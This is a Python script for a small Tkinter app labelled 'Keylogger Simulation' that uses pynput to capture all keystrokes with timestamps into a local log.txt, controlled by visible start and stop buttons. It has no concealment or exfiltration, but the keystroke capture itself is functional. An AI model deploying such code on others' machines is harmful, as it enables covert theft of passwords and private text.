import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import os
from datetime import datetime

# ✅ Set full path to log file
log_file_path = os.path.join(os.getcwd(), "log.txt")
listener = None

def log_key(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {key_str}"

    print(f"Logged: {entry}")
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{entry}\n")
    except Exception as e:
        print(f"🔴 Error writing to log file: {e}")

def run_listener():
    def listen():
        global listener
        try:
            listener = keyboard.Listener(on_press=log_key)
            listener.start()
        except Exception as e:
            print(f"🔴 Error starting listener: {e}")
            messagebox.showerror("Listener Error", f"Failed to start: {e}")

    thread = threading.Thread(target=listen, daemon=True)
    thread.start()

    start_btn.config(state=tk.DISABLED)
    stop_btn.config(state=tk.NORMAL)
    status_label.config(text="🔴 Logging active...")

def start_logging():
    run_listener()

def stop_logging():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
    start_btn.config(state=tk.NORMAL)
    stop_btn.config(state=tk.DISABLED)
    status_label.config(text="🟢 Logging stopped.")

def on_exit():
    global listener
    if listener:
        listener.stop()
    root.destroy()

# 🖼 GUI Setup
root = tk.Tk()
root.title("Keystroke Monitor - Research Edition")
root.geometry("320x180")
root.resizable(False, False)

title = tk.Label(root, text="Keylogger Simulation", font=("Helvetica", 14))
title.pack(pady=10)

status_label = tk.Label(root, text="🟢 Logging stopped.", font=("Helvetica", 10))
status_label.pack(pady=5)

btn_frame = tk.Frame(root)
btn_frame.pack()

start_btn = tk.Button(btn_frame, text="Start Logging", command=start_logging, width=12)
start_btn.grid(row=0, column=0, padx=5)

stop_btn = tk.Button(btn_frame, text="Stop Logging", command=stop_logging, width=12, state=tk.DISABLED)
stop_btn.grid(row=0, column=1, padx=5)

exit_btn = tk.Button(root, text="Exit", command=on_exit, width=26)
exit_btn.pack(pady=10)

root.protocol("WM_DELETE_WINDOW", on_exit)
root.mainloop()
